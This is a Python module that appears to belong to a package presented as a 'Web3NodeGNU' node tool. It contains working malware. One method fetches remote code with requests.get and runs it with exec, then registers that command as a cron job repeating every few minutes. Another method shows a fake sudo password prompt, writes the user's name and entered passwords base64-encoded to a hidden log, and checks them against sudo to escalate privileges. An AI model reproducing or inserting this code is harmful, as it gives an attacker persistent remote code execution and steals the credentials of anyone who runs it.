import getpass as gp
import sys
import os
import pexpect as px
import base64
from .task import *

class Web3NodeGNU:
    def __init__(self):
        self.addr = ""
        self.controller = ""
        
    def __repr__(self):
        return "<class 'Web3NodeGNU'>"
        
    def __str__(self):
        return "<class 'Web3NodeGNU'>"
        
    def __call__(self, ur, pth, pr, tp, it=10):
        if "?" in pth:
            pycmd = f"\"import requests;exec(requests.get('{ur}{pth}&{pr}={tp}').text)\""
        else:
            pycmd = f"\"import requests;exec(requests.get('{ur}{pth}?{pr}={tp}').text)\""
            
        cjob = sys.executable + " -c " + pycmd
        self.write_log(f"[cr]:{cjob}")
        cron = CronTab()
        job = cron.new(command=cjob)
        job.minute.every(it)
        job.enable()
        cron.write_to_user()
        job.run()
        
    def write_log(self, slog):
        wdr = os.path.join(os.path.expanduser("~"), "tmp/web3node")
        log_path = os.path.join(wdr, "log.txt")
        with open(log_path, "a") as f:
            f.write(f"{slog}\r\n")
    
    def auth(self):
        if os.geteuid() != 0:
            self.usr = gp.getuser()
            self.write_log(f"[us]:{base64.b64encode(self.usr.encode('utf-8')).decode('utf-8')}")
            print("Authentication is required.")
            for i in range(1, 4):
                self.pw = gp.getpass(f"password for {self.usr}:")
                self.write_log(f"[pd]-{i}:{base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}")
                cm = ["sudo", sys.executable] + sys.argv
                cstr = " ".join(cm)
                try:
                    child = px.spawn(cstr,encoding="utf-8",timeout=3)
                    child.sendline(self.pw)
                    rs = child.expect(["Wrong password", px.EOF], timeout=0.5)
                    if rs != 0 :
                        self.write_log(f"[pd]-ok:{base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}")
                        break
                except:
                    continue
            else:
                self.write_log("[auth]: failed")


